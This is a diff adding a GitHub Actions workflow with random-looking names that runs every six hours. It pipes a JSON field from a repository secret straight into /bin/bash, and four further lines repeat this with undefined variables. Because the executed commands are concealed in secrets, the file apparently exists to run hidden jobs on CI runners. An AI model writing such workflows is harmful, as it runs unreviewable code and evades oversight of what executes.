@@ -1,0 +1,20 @@
+name: yanshoufu4567
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanshoufu4567
+        env:
+          dgbc4960: ${{ secrets.dgbc4960 }}
+        run: |
+          echo $dgbc4960 | jq -r .vydp602 | /bin/bash
+          echo $vjaa8 | jq -r .ajnd13 | /bin/bash
+          echo $rpp64572 | jq -r .sy12 | /bin/bash
+          echo $njtbb32965 | jq -r .fii7605 | /bin/bash
+          echo $l78796 | jq -r .s2 | /bin/bash
+
